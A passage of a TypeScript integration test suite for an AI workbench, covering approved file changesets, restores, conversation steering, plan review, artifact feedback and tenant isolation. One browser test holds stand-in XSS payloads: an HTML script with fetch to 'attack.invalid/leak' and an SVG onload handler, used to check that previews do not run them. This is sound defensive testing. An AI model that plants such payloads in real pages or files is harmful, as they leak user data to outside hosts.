              `<!doctype html><meta name="viewport" content="width=device-width"><style>body{font:14px system-ui;margin:12px}*{box-sizing:border-box}${css}</style><div id="root"></div><script id="p08-input" type="application/json">${JSON.stringify({ artifact: a, sessionId: f.sessionId, workspaceId: f.context.workspaceId, headers: { 'x-p08-browser': 'synthetic' }, disabled: false }).replaceAll('<', '\\u003c')}</script><script src="/fixture.js"></script>`,
            );
            return;
          }
          if (path === '/fixture.js') {
            res.setHeader('content-type', 'application/javascript');
            res.end(js);
            return;
          }
          if (!path.startsWith('/api/v1/bridge/device/operations/')) {
            if (req.headers['x-p08-browser'] !== 'synthetic') {
              res.statusCode = 401;
              res.end();
              return;
            }
            res.setHeader('content-type', 'application/json');
            if (path.endsWith('/executions')) {
              res.end(
                JSON.stringify({
                  executions: await listChangesetRuns(
                    f.context,
                    f.sessionId,
                    a.id,
                    database,
                  ),
                }),
              );
              return;
            }
            if (path.startsWith('/api/v1/runtime/approvals/')) {
              res.end(
                JSON.stringify({
                  approval: await decideRuntimeActionApproval(
                    f.context,
                    path.split('/').at(-1)!,
                    JSON.parse(Buffer.concat(chunks).toString()),
                    database,
                  ),
                }),
              );
              return;
            }
            res.statusCode = 404;
            res.end();
            return;
          }
          if (path.endsWith('/heartbeat') && ++heartbeats === 3) {
            if (scenario === 'partial')
              await writeFile(join(root, 'README.md'), 'user changed');
            if (scenario === 'partial_cancel')
              await cancelRun(f.context, f.context.workspaceId!, activeRunId, {
                reason: 'synthetic between-file cancellation',
              });
          }
          const response = await handler(
            new Request(`http://localhost${path}`, {
              method: 'POST',
              headers: {
                authorization: String(req.headers.authorization ?? ''),
                'content-type': 'application/json',
              },
              body: Buffer.concat(chunks),
            }),
            path.split('/').at(-1)! as
              'next' | 'start' | 'receipts' | 'heartbeat' | 'output',
            path.split('/').at(-2),
          );
          if (path.endsWith('/receipts') && loseAck && response.ok) {
            loseAck = false;
            res.destroy();
            return;
          }
          res.statusCode = response.status;
          res.end(await response.text());
        })().catch((e) => {
          res.statusCode = 500;
          res.end(e instanceof Error ? e.message : 'fixture failed');
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      const addr = server.address();
      if (!addr || typeof addr === 'string') throw Error('listener');
      const origin = `http://127.0.0.1:${addr.port}`;
      const journal = await BridgeJournal.open({
        directory: join(f.root, 'journal'),
        server: origin,
        deviceId: f.device.id,
      });
      const client = new RuntimeBridgeOperationClient({
        config: {
          server: origin,
          deviceId: f.device.id,
          deviceName: 'P08',
          grants: [
            {
              id: f.grant,
              label: 'P08',
              rootPath: root,
              rootFingerprint: fingerprint,
            },
          ],
        },
        token: 'p08-synthetic-device',
        journal,
      });
      let browser: Playwright.Browser | undefined,
        page: Playwright.Page | undefined;
      const pageErrors: string[] = [];
      if (browserEnabled) {
        const { chromium } = createRequire(resolve('apps/worker/package.json'))(
          'playwright-core',
        ) as typeof Playwright;
        browser = await chromium.launch({
          headless: true,
          executablePath:
            '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
        });
        page = await browser.newPage({
          viewport: { width: 1200, height: 900 },
        });
        page.on('pageerror', (e) => pageErrors.push(e.message));
      }
      let abort: () => void = () => {};
      let finished: Promise<void> | undefined;
      const start = async (restoreOf: string | null) => {
        const body = {
          clientMessageId: randomUUID(),
          text: 'request',
          deliveryMode: 'follow_up',
          changesetAction: {
            artifactId: a.id,
            checksum: a.object.checksum,
            restoreOf,
          },
        };
        const sent = await sendChatMessage(
          f.context,
          f.context.workspaceId!,
          f.sessionId,
          body,
        );
        activeRunId = sent.run.id;
        const [frozen] =
          await database`select e.execution_snapshot,p.payload from allrice_employee_runs e join allrice_runs r on r.id=e.run_id join allrice_policy_snapshots p on p.id=r.policy_snapshot_id where r.id=${sent.run.id}`;
        expect(
          frozen!.execution_snapshot.capabilitySnapshot.bindings.toolNames,
        ).toContain('local.fs.write');
        expect(
          frozen!.execution_snapshot.capabilitySnapshot.grantedCapabilities,
        ).toContain('storage:write');
        expect(frozen!.payload.grants).toContainEqual(
          expect.objectContaining({
            resourceType: 'job',
            action: 'job:execute',
          }),
        );
        expect(
          (
            await sendChatMessage(
              f.context,
              f.context.workspaceId!,
              f.sessionId,
              body,
            )
          ).run.id,
        ).toBe(sent.run.id);
        await expect(
          sendChatMessage(f.context, f.context.workspaceId!, f.sessionId, {
            ...body,
            changesetAction: {
              ...body.changesetAction,
              checksum: digest('wrong'),
            },
          }),
        ).rejects.toThrow();
        const workerId = randomUUID(),
          job = await claimNextJob(workerId, 30000);
        const [claimedRun] =
          await database`select run_id from allrice_jobs where id=${job!.id}`;
        expect(claimedRun?.run_id).toBe(sent.run.id);
        finished = runClaimedJob(
          {
            workerId,
            jobId: job!.id,
            leaseToken: job!.lease!.token,
            leaseMs: 30000,
            heartbeatMs: 500,
            executionRoot: join(f.root, 'worker'),
            stopping: () => false,
            onAbortReady: (value) => {
              abort = value;
            },
          },
          executeEmployeeRun,
        );
        await vi.waitFor(
          async () => {
            const [j] =
              await database`select status,last_error_code,last_error_message from allrice_jobs where id=${job!.id}`;
            if (j?.status === 'failed' || j?.status === 'dead_letter')
              throw Error(JSON.stringify(j));
            const waiting = (
              await listChangesetRuns(f.context, f.sessionId, a.id, database)
            ).find((x) => x.runId === sent.run.id);
            expect(waiting?.snapshot?.status).toBe('waiting_user');
            expect(waiting?.approval?.request).toBeDefined();
          },
          { timeout: 10000, interval: 100 },
        );
        const item = (
          await listChangesetRuns(f.context, f.sessionId, a.id, database)
        ).find((x) => x.runId === sent.run.id)!;
        expect(item.approval?.response).toBeNull();
        const projected = await getInteractionStatus(
          f.context,
          f.sessionId,
          database,
        );
        expect(
          projected.inputs.find((x) => x.runId === sent.run.id),
        ).toMatchObject({ kind: 'changeset_request', artifactId: a.id });
        expect(
          projected.pendingActions.find((x) => x.runId === sent.run.id)
            ?.artifactId,
        ).toBe(a.id);
        return item;
      };
      const approve = async (
        item: Awaited<ReturnType<typeof start>>,
        decision: 'approved' | 'rejected' = 'approved',
      ) => {
        const req = item.approval!.request;
        await decideRuntimeActionApproval(
          f.context,
          req.approvalId,
          {
            contractVersion: 1,
            direction: 'response',
            kind: 'action_approval',
            requestId: req.requestId,
            version: req.version,
            requestDigest: req.requestDigest,
            task: req.task,
            responseId: randomUUID(),
            respondedBy: f.context.actor.id,
            respondedAt: new Date().toISOString(),
            approvalId: req.approvalId,
            decision,
          },
          database,
        );
      };
      try {
        const apply = await start(null);
        expect(await client.pollOnce()).toBe(false);
        if (scenario === 'reject') await approve(apply, 'rejected');
        // Age only this synthetic database deadline; do not change production TTL.
        else if (scenario === 'expire')
          await database`update allrice_approval_requests set requested_at=clock_timestamp()-interval '2 seconds',runtime_expires_at=clock_timestamp()-interval '1 second' where id=${apply.approval!.request.approvalId}`;
        else if (scenario === 'cancel')
          await cancelRun(f.context, f.context.workspaceId!, apply.runId, {
            reason: 'synthetic cancellation',
          });
        if (['reject', 'expire', 'cancel'].includes(scenario)) {
          await finished;
          expect(await client.pollOnce()).toBe(false);
          await expect(readFile(join(root, 'test.mjs'))).rejects.toMatchObject({
            code: 'ENOENT',
          });
          expect(await readFile(join(root, 'README.md'), 'utf8')).toBe('old');
          expect(
            (await listChangesetRuns(f.context, f.sessionId, a.id, database))[0]
              ?.snapshot?.result?.effects,
          ).toBe('none');
          return;
        }
        if (page) {
          await page.goto(origin);
          await page
            .getByRole('button', { name: '批准这一次文件操作', exact: true })
            .click();
        } else await approve(apply);
        expect(
          await f.ledger().claimNextBridgeOperation({
            scope: f.task.scope,
            deviceId: f.device.id,
            leaseMs: 30000,
          }),
        ).toBeNull();
        await expect(client.pollOnce()).rejects.toThrow();
        await client.flush();
        expect(await client.pollOnce()).toBe(false);
        await finished;
        expect(await readFile(join(root, 'README.md'), 'utf8')).toBe(
          scenario === 'partial'
            ? 'user changed'
            : scenario === 'partial_cancel'
              ? 'old'
              : 'reviewed',
        );
        expect(await readFile(join(root, 'test.mjs'), 'utf8')).toContain(
          'P08 project passed',
        );
        const [done] = await listChangesetRuns(
          f.context,
          f.sessionId,
          a.id,
          database,
        );
        expect(done?.runState).toBe(
          scenario === 'partial_cancel'
            ? 'canceled'
            : scenario === 'partial'
              ? 'failed'
              : 'succeeded',
        );
        expect(done?.evidence.result?.files.map((x) => x.status)).toEqual(
          scenario === 'partial_cancel'
            ? ['applied', 'canceled']
            : scenario === 'partial'
              ? ['applied', 'conflict']
              : ['applied', 'applied'],
        );
        if (page) {
          await page.getByText('应用任务 · 已完成', { exact: true }).waitFor();
          await page.reload();
          await page
            .getByRole('button', { name: '请求恢复已确认落盘的文件' })
            .waitFor();
        }
        await expect(
          listChangesetRuns(
            { ...f.context, actor: { type: 'user', id: randomUUID() } },
            f.sessionId,
            a.id,
            database,
          ),
        ).rejects.toThrow();
        const restore = await start(apply.runId);
        expect(restore.payload?.arguments.files).toEqual(
          [...proposal.files]
            .reverse()
            .filter(
              (x) =>
                !['partial', 'partial_cancel'].includes(scenario) ||
                x.path === 'test.mjs',
            )
            .map((x) => ({ path: x.path, before: x.after, after: x.before })),
        );
        if (scenario === 'restore_conflict')
          await writeFile(join(root, 'test.mjs'), 'user follow-up edit');
        if (page) {
          await page.reload();
          await page
            .getByText('本次将处理 2 个文件 · 精确授权范围', { exact: true })
            .last()
            .click();
          await page
            .getByText('审查 test.mjs 的本次前后内容', { exact: true })
            .last()
            .click();
          await page.getByText('删除这个文件', { exact: true }).waitFor();
          await page
            .getByRole('button', { name: '批准这一次文件操作', exact: true })
            .click();
        } else await approve(restore);
        expect(await client.pollOnce()).toBe(true);
        await finished;
        expect(await readFile(join(root, 'README.md'), 'utf8')).toBe(
          scenario === 'partial'
            ? 'user changed'
            : scenario === 'restore_conflict'
              ? 'reviewed'
              : 'old',
        );
        if (scenario === 'restore_conflict')
          expect(await readFile(join(root, 'test.mjs'), 'utf8')).toBe(
            'user follow-up edit',
          );
        else
          await expect(readFile(join(root, 'test.mjs'))).rejects.toMatchObject({
            code: 'ENOENT',
          });
        expect(
          (await listChangesetRuns(f.context, f.sessionId, a.id, database))[1]
            ?.runState,
        ).toBe(scenario === 'restore_conflict' ? 'failed' : 'succeeded');
        if (page) {
          await page.getByText('恢复任务 · 已完成', { exact: true }).waitFor();
          await page.setViewportSize({ width: 390, height: 844 });
          expect(
            await page.evaluate(
              () => document.documentElement.scrollWidth <= innerWidth,
            ),
          ).toBe(true);
          expect(pageErrors).toEqual([]);
          const evidenceDirectory = await mkdtemp(
            resolve('.local/p08-browser-'),
          );
          await page.screenshot({
            path: join(evidenceDirectory, 'p08-recovery.png'),
            fullPage: true,
          });
          console.log('P08 browser evidence:', evidenceDirectory);
        }
        const [count] =
          await database`select count(*)::int n from allrice_runtime_operation_events e join allrice_runtime_operations o on o.id=e.operation_id where o.organization_id=${f.context.organizationId} and e.payload->'signal'->>'type'='operation.started'`;
        expect(count?.n).toBe(2);
      } finally {
        abort();
        await finished;
        await browser?.close();
        await journal.close();
        await new Promise<void>((r) => server.close(() => r()));
      }
    },
    45000,
  );
  it('P10 persists strict input identity, native adoption and cancels expired steer without creating a later task', async () => {
    const f = await artifactFixture(riceManifest());
    f.context.memberships = f.policyPayload.memberships;
    const workerId = f.execution.worker.id;
    const turnId = `native-${f.sessionId}:turn:1`;
    await database`update allrice_conversation_runtimes set worker_id=${workerId},active_turn_id=${turnId} where session_id=${f.sessionId}`;
    const input = {
      clientMessageId: randomUUID(),
      text: 'Use corrected numbers.',
      deliveryMode: 'steer',
      expectedTurnId: turnId,
      expectedGeneration: 3,
    };
    const sent = await sendChatMessage(
      f.context,
      f.context.workspaceId!,
      f.sessionId,
      input,
    );
    expect(sent.delivery).toBe('steer_pending');
    expect(
      (
        await sendChatMessage(
          f.context,
          f.context.workspaceId!,
          f.sessionId,
          input,
        )
      ).run.id,
    ).toBe(f.run);
    await expect(
      sendChatMessage(f.context, f.context.workspaceId!, f.sessionId, {
        ...input,
        text: 'different',
      }),
    ).rejects.toThrow('input_id_conflict');
    const claimInput = {
      organizationId: f.context.organizationId,
      workspaceId: f.context.workspaceId!,
      sessionId: f.sessionId,
      workerId,
      generation: 3,
      turnId,
    };
    expect(
      await claimConversationSteer({ ...claimInput, workerId: randomUUID() }),
    ).toBeNull();
    const command = await claimConversationSteer(claimInput);
    expect(command?.inputKind).toBe('steer_current');
    const pending = {
      status: 'pending' as const,
      inputId: input.clientMessageId,
      messageId: randomUUID(),
    };
    await expect(
      consumeConversationSteer({
        commandId: command!.id,
        workerId,
        proof: pending,
      }),
    ).rejects.toThrow('INPUT_ADOPTION_PROOF_REQUIRED');
    await deferConversationSteer({
      commandId: command!.id,
      workerId,
      proof: pending,
    });
    expect(
      (await getInteractionStatus(f.context, f.sessionId)).inputs[0]?.status,
    ).toBe('pending');
    await claimConversationSteer({ ...claimInput, drain: true });
    const proof = {
      ...pending,
      status: 'adopted' as const,
      turnId,
      sequence: 17,
      checkpoint: 'step_user_message' as const,
    };
    await consumeConversationSteer({ commandId: command!.id, workerId, proof });
    const status = await getInteractionStatus(f.context, f.sessionId);
    expect(status.inputs[0]).toMatchObject({
      status: 'adopted',
      evidence: { sequence: 17, checkpoint: 'step_user_message' },
    });
    const unanswered = {
      ...input,
      clientMessageId: randomUUID(),
      text: 'later correction',
    };
    const late = await sendChatMessage(
      f.context,
      f.context.workspaceId!,
      f.sessionId,
      unanswered,
    );
    await releaseConversationRuntime({
      organizationId: f.context.organizationId,
      workspaceId: f.context.workspaceId!,
      sessionId: f.sessionId,
      runId: f.run,
      workerId,
      outcome: 'idle',
    });
    const [job] =
      await database`select status from allrice_jobs where run_id=${late.fallbackRunId!}`;
    expect(job!.status).toBe('canceled');
    await expect(
      sendChatMessage(f.context, f.context.workspaceId!, f.sessionId, {
        ...input,
        clientMessageId: randomUUID(),
      }),
    ).rejects.toThrow('input_turn_changed');
    expect(
      (await getInteractionStatus(f.context, f.sessionId)).inputs.some(
        (i) => i.status === 'rejected',
      ),
    ).toBe(true);
    await expect(
      getInteractionStatus(
        { ...f.context, actor: { type: 'user', id: randomUUID() } },
        f.sessionId,
      ),
    ).rejects.toThrow('artifact_not_found');
  });
  it('P10 binds plan acceptance and feedback to immutable versions, distinct Runs and exact-once queue insertion', async () => {
    const f = await artifactFixture(riceManifest());
    f.context.memberships = f.policyPayload.memberships;
    const plan = await f.publish(
      'plan',
      'Plan one\nPlan two',
      undefined,
      'plan',
    );
    const input = {
      clientMessageId: randomUUID(),
      text: '认可',
      deliveryMode: 'follow_up',
      reviewContinuation: {
        kind: 'plan_review',
        artifactId: plan.id,
        checksum: plan.object.checksum,
      },
    };
    const first = await sendChatMessage(
      f.context,
      f.context.workspaceId!,
      f.sessionId,
      input,
    );
    expect(first.delivery).toBe('follow_up');
    expect(first.userMessage.content.interaction?.type).toBe('review_response');
    expect(first.userMessage.content.text).toContain('不是文件写入');
    expect(
      (
        await sendChatMessage(
          f.context,
          f.context.workspaceId!,
          f.sessionId,
          input,
        )
      ).run.id,
    ).toBe(first.run.id);
    await expect(
      sendChatMessage(f.context, f.context.workspaceId!, f.sessionId, {
        ...input,
        clientMessageId: randomUUID(),
      }),
    ).rejects.toThrow('review_already_sent');
    const draft = f.draft(plan);
    await saveArtifactFeedback(
      f.context,
      f.sessionId,
      draft,
      false,
      f.storage,
      database,
    );
    const feedbackInput = {
      clientMessageId: randomUUID(),
      text: '修订',
      deliveryMode: 'follow_up',
      reviewContinuation: {
        kind: 'version_feedback',
        artifactId: plan.id,
        checksum: plan.object.checksum,
        feedbackId: draft.feedbackId,
      },
    };
    await expect(
      sendChatMessage(
        f.context,
        f.context.workspaceId!,
        f.sessionId,
        feedbackInput,
      ),
    ).rejects.toThrow('submitted_feedback_required');
    await saveArtifactFeedback(
      f.context,
      f.sessionId,
      { ...draft, expectedRevision: 1 },
      true,
      f.storage,
      database,
    );
    const second = await sendChatMessage(
      f.context,
      f.context.workspaceId!,
      f.sessionId,
      feedbackInput,
    );
    expect(second.run.id).not.toBe(first.run.id);
    expect(second.userMessage.content.text).toContain(draft.comments[0]!.text);
    await assertReviewRunCurrent(f.context, f.sessionId, first.run.id);
    await f.publish('new-plan', 'Updated plan', plan.object.id, 'plan');
    await expect(
      assertReviewRunCurrent(f.context, f.sessionId, first.run.id),
    ).rejects.toThrow('review_version_changed');
    // ACK-loss retry returns the existing immutable response, even after a newer version arrives.
    expect(
      (
        await sendChatMessage(
          f.context,
          f.context.workspaceId!,
          f.sessionId,
          input,
        )
      ).run.id,
    ).toBe(first.run.id);
    await expect(
      sendChatMessage(f.context, f.context.workspaceId!, f.sessionId, {
        ...input,
        clientMessageId: randomUUID(),
      }),
    ).rejects.toThrow('version_conflict');
    expect(
      await database`select response_id from allrice_review_continuations where organization_id=${f.context.organizationId}`,
    ).toHaveLength(2);
    expect(
      await database`select id from allrice_runtime_operations where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
    expect(
      await database`select id from allrice_approval_requests where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
  });
  it('P06 publishes immutable existing storage/version identities; idempotent concurrent delivery writes once', async () => {
    const f = await artifactFixture();
    const [a, b] = await Promise.all([f.publish(), f.publish()]);
    expect(a.id).toBe(b.id);
    expect(a.id).toBe(a.version.id);
    expect(a.object.immutable).toBe(true);
    expect(a.provenance).toEqual({
      kind: 'model_proposal',
      runId: f.run,
      operationId: null,
      stepId: null,
    });
    expect((await readArtifactBytes(f.storage, a.object)).toString()).toBe(
      'first line\nsecond line',
    );
    expect(
      await database`select id from allrice_storage_objects where organization_id=${f.context.organizationId}`,
    ).toHaveLength(1);
    await expect(f.publish('publish', 'different bytes')).rejects.toThrow(
      'idempotency_conflict',
    );
    await expect(
      database`update allrice_workbench_artifacts set kind='plan' where version_id=${a.id}`,
    ).rejects.toThrow('immutable');
    await expect(
      database`update allrice_storage_objects set checksum=${digest('changed')} where id=${a.object.id}`,
    ).rejects.toThrow('immutable');
  });
  it('P06 keeps draft, submitted batch, stale version and explicit response distinct', async () => {
    const f = await artifactFixture(),
      a = await f.publish(),
      draft = f.draft(a);
    const saved = await saveArtifactFeedback(
      f.context,
      f.sessionId,
      draft,
      false,
      f.storage,
      database,
    );
    expect(saved.state).toBe('draft');
    expect(saved.revision).toBe(1);
    expect(
      await saveArtifactFeedback(
        f.context,
        f.sessionId,
        draft,
        false,
        f.storage,
        database,
      ),
    ).toEqual(saved);
    const submission = { ...draft, expectedRevision: 1 };
    const [first, duplicate] = await Promise.all([
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        submission,
        true,
        f.storage,
        database,
      ),
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        submission,
        true,
        f.storage,
        database,
      ),
    ]);
    expect(first).toEqual(duplicate);
    expect(first.state).toBe('submitted');
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        {
          ...submission,
          comments: [{ ...draft.comments[0], text: 'changed' }],
        },
        true,
        f.storage,
        database,
      ),
    ).rejects.toThrow('already_submitted');
    const b = await f.publish(
      'revision',
      'first line\nrevised line',
      a.object.id,
    );
    const [pending] = await listArtifactFeedback(
      f.context,
      f.sessionId,
      a.id,
      database,
    );
    expect(pending?.stale).toBe(true);
    expect(pending?.state).toBe('submitted');
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        f.draft(a),
        true,
        f.storage,
        database,
      ),
    ).rejects.toThrow('version_changed');
    expect(
      (await getWorkbenchArtifact(f.context, f.sessionId, b.id, database))
        .stale,
    ).toBe(false);
    const addressed = await addressArtifactFeedback(
      f.context,
      f.sessionId,
      {
        feedbackId: draft.feedbackId,
        resultArtifactId: b.id,
        resolution: '回应见第二行；等待用户复核。',
      },
      database,
    );
    expect(addressed.state).toBe('addressed');
    expect(addressed.resultArtifactId).toBe(b.id);
    expect(
      await database`select id from allrice_approval_requests where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
  });
  it('P06 rejects stale parent, stale draft revision, invalid anchors and non-descendant resolution', async () => {
    const f = await artifactFixture(),
      a = await f.publish(),
      draft = f.draft(a);
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        { ...draft, checksum: digest('wrong') },
        true,
        f.storage,
        database,
      ),
    ).rejects.toThrow('version_changed');
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        {
          ...draft,
          comments: [
            {
              ...draft.comments[0],
              anchor: { ...draft.comments[0]!.anchor, endLine: 99 },
            },
          ],
        },
        false,
        f.storage,
        database,
      ),
    ).rejects.toThrow('anchor_changed');
    await saveArtifactFeedback(
      f.context,
      f.sessionId,
      draft,
      false,
      f.storage,
      database,
    );
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        {
          ...draft,
          comments: [{ ...draft.comments[0], text: 'different browser draft' }],
        },
        false,
        f.storage,
        database,
      ),
    ).rejects.toThrow('revision_conflict');
    await saveArtifactFeedback(
      f.context,
      f.sessionId,
      { ...draft, expectedRevision: 1 },
      true,
      f.storage,
      database,
    );
    const foreign = await f.publish('unrelated', 'separate series');
    await expect(
      addressArtifactFeedback(
        f.context,
        f.sessionId,
        {
          feedbackId: draft.feedbackId,
          resultArtifactId: foreign.id,
          resolution: 'Not a revision',
        },
        database,
      ),
    ).rejects.toThrow('invalid_resolution');
    await f.publish('revision', 'second version', a.object.id);
    await expect(
      f.publish('stale parent', 'third version', a.object.id),
    ).rejects.toThrow('version_changed');
  });
  it('P06 rechecks tenant, owner, workspace and revoked membership for both content and feedback', async () => {
    const f = await artifactFixture(),
      a = await f.publish(),
      draft = f.draft(a);
    for (const context of [
      { ...f.context, organizationId: randomUUID() },
      { ...f.context, workspaceId: randomUUID() },
      { ...f.context, actor: { type: 'user' as const, id: randomUUID() } },
    ]) {
      await expect(
        getWorkbenchArtifact(context, f.sessionId, a.id, database),
      ).rejects.toThrow();
      await expect(
        saveArtifactFeedback(
          context,
          f.sessionId,
          draft,
          true,
          f.storage,
          database,
        ),
      ).rejects.toThrow();
    }
    await database`update allrice_memberships set active=false where id=${f.membership}`;
    await expect(
      getWorkbenchArtifact(f.context, f.sessionId, a.id, database),
    ).rejects.toThrow('identity_denied');
    await expect(f.publish('new')).rejects.toThrow('identity_denied');
  });
  it('P06 binds Changeset content hashes and target; proposal and comments do not execute', async () => {
    const f = await artifactFixture();
    const text = 'console.log(1);',
      checksum = `sha256:${createHash('sha256').update(text).digest('hex')}`;
    const execution = f.operation().input.snapshot.binding.execution;
    const document = {
      contractVersion: 1,
      comparisonScope: 'changeset',
      execution,
      files: [{ path: 'code.mjs', before: null, after: { text, checksum } }],
    };
    const a = await f.publish(
      'changeset',
      JSON.stringify(document),
      undefined,
      'changeset',
    );
    expect(a.execution).toEqual(execution);
    const draft = {
      ...f.draft(a),
      comments: [
        {
          id: randomUUID(),
          anchor: {
            kind: 'lines',
            path: 'code.mjs',
            side: 'after',
            startLine: 1,
            endLine: 1,
            checksum,
          },
          text: 'rename function',
        },
      ],
    };
    expect(
      (
        await saveArtifactFeedback(
          f.context,
          f.sessionId,
          draft,
          true,
          f.storage,
          database,
        )
      ).state,
    ).toBe('submitted');
    await expect(
      f.publish(
        'wronghash',
        JSON.stringify({
          ...document,
          files: [
            {
              ...document.files[0],
              after: { text, checksum: digest('other') },
            },
          ],
        }),
        undefined,
        'changeset',
      ),
    ).rejects.toThrow('content_mismatch');
    await expect(
      f.publish(
        'target',
        JSON.stringify({
          ...document,
          execution: { ...document.execution, deviceId: randomUUID() },
        }),
        undefined,
        'changeset',
      ),
    ).rejects.toThrow('target_unavailable');
    expect(
      await database`select id from allrice_runtime_operations where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
  });
  it('P06 reads pre-upgrade deliverables without guessing a historical Run or target', async () => {
    const f = await artifactFixture(),
      bytes = Buffer.from('legacy file');
    const object = createToolBrokerExportObject({
      context: f.execution,
      mediaType: 'text/plain',
      sizeBytes: bytes.length,
      checksum: `sha256:${createHash('sha256').update(bytes).digest('hex')}`,
    });
    await f.storage.put(object, new Blob([bytes]).stream());
    const old = await registerToolBrokerExport(
      {
        context: f.execution,
        sessionId: f.sessionId,
        object,
        fileName: 'old.txt',
        format: 'text',
      },
      database,
    );
    const page = await listWorkbenchArtifacts(
      f.context,
      f.sessionId,
      undefined,
      database,
    );
    expect(page.artifacts[0]?.id).toBe(old.id);
    expect(page.artifacts[0]?.provenance).toEqual({
      kind: 'legacy_deliverable',
      runId: null,
      stepId: null,
      operationId: null,
    });
    expect(page.artifacts[0]?.execution).toBeNull();
    expect(
      await database`select version_id from allrice_workbench_artifacts where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
  });
  it('P06 does not publish with disabled flag or lost Worker lease', async () => {
    const f = await artifactFixture();
    vi.stubEnv('ALLRICE_WORKBENCH_ENABLED', '0');
    await expect(f.publish()).rejects.toThrow('feature_disabled');
    vi.stubEnv('ALLRICE_WORKBENCH_ENABLED', '1');
    await database`update allrice_jobs set lease_expires_at=clock_timestamp()-interval '1 second' where id=${f.execution.jobId}`;
    await expect(f.publish()).rejects.toThrow('run_unavailable');
    expect(
      await database`select id from allrice_storage_objects where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
  });
  it('P06 rolls back registrations and cleans only its unregistered object on storage failure', async () => {
    const f = await artifactFixture(),
      original = f.storage.put.bind(f.storage);
    const written: string[] = [];
    vi.spyOn(f.storage, 'put').mockImplementation(async (object, content) => {
      written.push(object.key);
      await original(object, content);
      throw Error('simulated storage acknowledgement failure');
    });
    await expect(f.publish()).rejects.toThrow('acknowledgement failure');
    expect(
      await database`select id from allrice_storage_objects where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
    expect(
      await database`select version_id from allrice_workbench_artifacts where organization_id=${f.context.organizationId}`,
    ).toHaveLength(0);
    expect(written).toHaveLength(1);
    await expect(readFile(join(f.root, written[0]!))).rejects.toThrow('ENOENT');
  });
  it('P06 permits only identical committed retries after a Worker lease ends', async () => {
    const f = await artifactFixture(),
      a = await f.publish();
    await database`update allrice_jobs set lease_expires_at=clock_timestamp()-interval '1 second' where id=${f.execution.jobId}`;
    expect((await f.publish()).id).toBe(a.id);
    await expect(f.publish('new')).rejects.toThrow('run_unavailable');
    await expect(f.publish('publish', 'different')).rejects.toThrow(
      'idempotency_conflict',
    );
  });
  it('P06 never silently hides a submitted feedback batch beyond the page bound', async () => {
    const f = await artifactFixture(),
      a = await f.publish();
    const template = f.draft(a);
    const comments = [
      {
        id: randomUUID(),
        anchor: { kind: 'whole' },
        text: 'Synthetic bounded feedback',
      },
    ];
    await database`insert into allrice_artifact_feedback(id,organization_id,workspace_id,actor_id,artifact_id,checksum,revision,comments,state)
      select gen_random_uuid(),${f.context.organizationId},${f.context.workspaceId},${f.context.actor.id},${a.id},${a.object.checksum},1,${database.json(comments)},'draft' from generate_series(1,100)`;
    expect(
      await listArtifactFeedback(f.context, f.sessionId, a.id, database),
    ).toHaveLength(100);
    await expect(
      saveArtifactFeedback(
        f.context,
        f.sessionId,
        template,
        true,
        f.storage,
        database,
      ),
    ).rejects.toThrow('feedback_limit');
  });
  it.skipIf(process.env.ALLRICE_WORKBENCH_BROWSER_TEST !== '1')(
    'P07 real Chromium and PostgreSQL: Cline diff, persisted review, stale versions and inert previews',
    async () => {
      const f = await artifactFixture(riceManifest());
      f.context.memberships = f.policyPayload.memberships;
      const original = 'export const answer = 41;\nconsole.log(answer);\n',
        revised = 'export const answer = 42;\nconsole.log(answer);\n';
      const sha = (text: string) =>
        `sha256:${createHash('sha256').update(text).digest('hex')}`;
      const changes = {
        contractVersion: 1,
        comparisonScope: 'changeset',
        execution: f.operation().input.snapshot.binding.execution,
        files: [
          {
            path: 'answer.ts',
            before: { text: original, checksum: sha(original) },
            after: { text: revised, checksum: sha(revised) },
          },
        ],
      };
      const change = await f.publish(
        'browser-change',
        JSON.stringify(changes),
        undefined,
        'changeset',
      );
      const html =
        '<script>globalThis.P07_ATTACK=1;fetch("https://attack.invalid/leak")</script><img src="https://attack.invalid/pixel">';
      const htmlArtifact = await publishWorkbenchArtifact(
        {
          context: f.execution,
          sessionId: f.sessionId,
          callId: 'html',
          kind: 'document',
          fileName: 'preview.html',
          format: 'text',
          mediaType: 'text/html',
          bytes: Buffer.from(html),
        },
        f.storage,
        database,
      );
      const textArtifact = await f.publish(
        'document',
        'first line\nsecond line',
      );
      const svg =
        '<svg xmlns="http://www.w3.org/2000/svg" onload="globalThis.P07_ATTACK=2"><image href="https://attack.invalid/svg"/></svg>';
      const svgArtifact = await publishWorkbenchArtifact(
        {
          context: f.execution,
          sessionId: f.sessionId,
          callId: 'svg',
          kind: 'document',
          fileName: 'untrusted.svg',
          format: 'text',
          mediaType: 'image/svg+xml',
          bytes: Buffer.from(svg),
        },
        f.storage,
        database,
      );
      const longText = 'row data\n'.repeat(20_000);
      const largeArtifact = await f.publish(
        'large-changeset',
        JSON.stringify({
          ...changes,
          files: [
            {
              path: 'large.txt',
              before: null,
              after: { text: longText, checksum: sha(longText) },
            },
          ],
        }),
        undefined,
        'changeset',
      );
      const evidenceDir = await mkdtemp(resolve('.local/p07-browser-'));
      const require = createRequire(resolve('apps/worker/package.json'));
      const { chromium } = require('playwright-core') as typeof Playwright;
      const build = createRequire(require.resolve('tsx/package.json'))(
        'esbuild',
      ).build;
      const output = await build({
        entryPoints: [resolve('apps/web/test/workbench-page.tsx')],
        bundle: true,
        write: false,
        outdir: join(f.root, 'ui'),
        platform: 'browser',
        format: 'esm',
        splitting: true,
        minify: true,
        jsx: 'automatic',
        define: { 'process.env.NODE_ENV': '"production"' },
      });
      const assets = new Map<string, { text: string; contents: Uint8Array }>(
        output.outputFiles.map(
          (file: { path: string; text: string; contents: Uint8Array }) => [
